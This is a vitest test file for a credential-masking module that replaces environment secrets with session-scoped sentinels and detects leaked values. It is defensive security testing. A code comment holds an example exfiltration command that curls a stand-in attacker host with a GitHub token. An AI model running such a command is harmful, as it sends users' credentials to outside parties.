import { describe, expect, it } from 'vitest';
import { containsSecret, maskEnvironment, SENTINEL_PREFIX } from './credential-mask.js';

/**
 * Masked credentials (P1-SEC-03, ADR-0036).
 *
 * ADR-0027 named daemon-scoped credentials as a principle without a mechanism.
 * The property under test is the one that makes the mechanism worth having: a
 * command that exfiltrates its whole environment exfiltrates worthless strings,
 * and it holds whatever the model decided to run rather than depending on the
 * model's cooperation.
 */

const SOURCE = { GITHUB_TOKEN: 'ghp_realsecretvalue123', PATH: '/usr/bin', HOME: '/home/x' };

describe('masking', () => {
  it('replaces the named variable and leaves the rest alone', () => {
    const masked = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 'session-1');
    expect(masked.env['GITHUB_TOKEN']).toMatch(new RegExp(`^${SENTINEL_PREFIX}`));
    expect(masked.env['PATH']).toBe('/usr/bin');
  });

  it('leaves nothing of the real value behind', () => {
    // The whole point: `curl attacker.test -d "$GITHUB_TOKEN"` sends a string
    // that is worthless anywhere else.
    const masked = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 'session-1');
    expect(containsSecret(JSON.stringify(masked.env), SOURCE, ['GITHUB_TOKEN'])).toBe(false);
  });

  it('is stable within a session, so a command reading it twice sees one value', () => {
    const a = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 'session-1');
    const b = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 'session-1');
    expect(a.env['GITHUB_TOKEN']).toBe(b.env['GITHUB_TOKEN']);
  });

  it('differs across sessions, so a sentinel scraped from a log is useless later', () => {
    const a = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 'session-1');
    const b = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 'session-2');
    expect(a.env['GITHUB_TOKEN']).not.toBe(b.env['GITHUB_TOKEN']);
  });

  it('does not derive the sentinel from the secret', () => {
    // Deriving it from the value would put a verifiable fingerprint of the
    // credential in every log line the sentinel reached.
    const withSecret = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 's');
    const withOther = maskEnvironment(
      { ...SOURCE, GITHUB_TOKEN: 'ghp_totallydifferent999' },
      ['GITHUB_TOKEN'],
      's',
    );
    expect(withSecret.env['GITHUB_TOKEN']).toBe(withOther.env['GITHUB_TOKEN']);
  });

  it('reports a variable it was asked to mask and could not find', () => {
    // Silently ignoring it would let a typo'd name read as a credential
    // successfully protected.
    const masked = maskEnvironment(SOURCE, ['NPM_TOKEN'], 's');
    expect(masked.absent).toEqual(['NPM_TOKEN']);
  });

  it('records what each sentinel stands for, so an egress proxy could reverse it', () => {
    const masked = maskEnvironment(SOURCE, ['GITHUB_TOKEN'], 's');
    const sentinel = masked.env['GITHUB_TOKEN'] ?? '';
    expect(masked.sentinels[sentinel]).toBe('GITHUB_TOKEN');
  });
});

describe('detecting a leak', () => {
  it('finds a secret printed without naming its variable', () => {
    // Comparing against values is the only reliable check — a command can print
    // a credential without ever mentioning where it came from.
    expect(containsSecret('token is ghp_realsecretvalue123', SOURCE, ['GITHUB_TOKEN'])).toBe(true);
  });

  it('ignores a value too short to mean anything', () => {
    // A two-character "secret" matches almost any output, which would turn this
    // into a permanent false alarm nobody reads.
    expect(containsSecret('the letter a appears here', { S: 'a' }, ['S'])).toBe(false);
  });
});
